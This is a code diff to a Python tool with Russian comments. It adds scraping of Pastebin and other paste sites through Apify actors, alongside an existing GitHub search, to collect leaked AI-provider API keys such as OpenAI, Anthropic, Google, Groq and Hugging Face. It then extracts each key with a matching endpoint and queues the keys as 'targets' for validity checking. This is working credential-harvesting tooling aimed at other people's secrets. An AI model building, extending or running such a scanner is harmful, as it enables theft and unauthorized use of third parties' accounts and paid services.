@@ -115,6 +115,41 @@ def get_urls_from_repo_configs(repo):
     repo_url_cache[repo] = list(set(found_urls))
     return repo_url_cache[repo]
 
+def extract_keys_from_text(text):
+    """Извлекает ключи и эндпоинты из текста (для Apify)"""
+    targets = []
+    lines = text.split('\n')
+    for line in lines:
+        for p in KEY_PATTERNS:
+            for match in p["regex"].finditer(line):
+                token = match.group(0)
+                
+                if p["provider"] == "generic-sk":
+                    if any(token.startswith(prefix) for prefix in ["sk-proj-", "sk-ant-", "sk-kimi-", "sk-cp-", "sk-sp-", "sk-or-v1-"]):
+                        continue
+                
+                api_urls = []
+                
+                # 1. URL в строке
+                for u in URL_REGEX.findall(line):
+                    if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
+                    match_url = re.search(r'(.*?/v\d+(?:beta\d*)?)', u)
+                    if not match_url:
+                        match_url = re.search(r'(.*?/api)', u)
+                    if match_url: api_urls.append(match_url.group(1))
+                    
+                # 2. Префикс ключа
+                if not api_urls and p["provider"] != "generic-sk":
+                    api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
+                    
+                # 3. Дефолт
+                if not api_urls:
+                    api_urls.append(PROVIDER_ENDPOINTS["default"])
+                    
+                for url in list(set(api_urls))[:1]:
+                    if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+    return targets
+
 def fetch_github_targets():
     logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
@@ -223,6 +258,62 @@ def fetch_github_targets():
         logger.error(f"❌ Ошибка GitHub: {e}")
         return []
 
+from apify_client import ApifyClient
+
+# ─── ПАРСИНГ APIFY (OSINT) ─────────────────────────────────────────────────
+APIFY_TOKEN = os.getenv("APIFY_TOKEN")
+
+def fetch_apify_targets():
+    if not APIFY_TOKEN:
+        logger.warning("⚠️ APIFY_TOKEN не задан. Пропускаю поиск на Paste-сайтах.")
+        return []
+        
+    client = ApifyClient(APIFY_TOKEN)
+    targets = []
+    
+    # Случайно выбираем один из двух акторов для разнообразия
+    actor_choice = random.choice(["jungle", "thescrapelab"])
+    
+    # Базовые ключевые слова для поиска (наши паттерны)
+    search_terms = ["sk-", "hf_", "sk-proj-", "sk-ant-", "AIzaSy", "pplx-", "gsk_"]
+    
+    try:
+        if actor_choice == "jungle":
+            logger.info("📋 Ищу ключи на Paste-сайтах через jungle_synthesizer...")
+            run_input = {
+                "keywords": search_terms,
+                "sites": ["pastebin.com", "gist.github.com", "ideone.com", "paste.org", "textbin.net"],
+                "maxItems": 30
+            }
+            run = client.actor("jungle_synthesizer/osint-scraper").call(run_input=run_input)
+            
+            if run:
+                for item in client.dataset(run.default_dataset_id).iterate_items():
+                    # У jungle_synthesizer сниппет лежит в поле 'snippet'
+                    snippet = item.get("snippet", "")
+                    if snippet:
+                        targets.extend(extract_keys_from_text(snippet))
+        else:
+            logger.info("📋 Ищу ключи на Pastebin через thescrapelab...")
+            run_input = {
+                "searchKeywords": search_terms,
+                "maxItems": 30
+            }
+            run = client.actor("thescrapelab/pastebin-osint-scraper").call(run_input=run_input)
+            
+            if run:
+                for item in client.dataset(run.default_dataset_id).iterate_items():
+                    # У thescrapelab текст может лежать в 'text', 'content' или 'snippet'
+                    text = item.get("text") or item.get("content") or item.get("snippet") or ""
+                    if text:
+                        targets.extend(extract_keys_from_text(text))
+                        
+        logger.info(f"✅ Apify ({actor_choice}): найдено целей: {len(targets)}")
+        return targets
+    except Exception as e:
+        logger.error(f"❌ Ошибка Apify ({actor_choice}): {e}")
+        return []
+
 # ─── ПРОВЕРКА ──────────────────────────────────────────────────────────────
 def check_endpoint(api_key, endpoint):
     try:
@@ -269,8 +360,15 @@ async def long_scan_loop():
     logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
     
     while time.time() - start_time < TOTAL_RUN_TIME:
-        targets = await asyncio.to_thread(fetch_github_targets)
+        # 60% - GitHub, 20% - Jungle, 20% - TheScrapelab
+        chance = random.random()
+        if chance < 0.6:
+            targets = await asyncio.to_thread(fetch_github_targets)
+        else:
+            targets = await asyncio.to_thread(fetch_apify_targets)
+            
         total_checked += len(targets)
+        # ... дальше идет цикл for t in targets: (его менять не нужно)
         
         for t in targets:
             key, endpoint = t["key"], t["endpoint"]
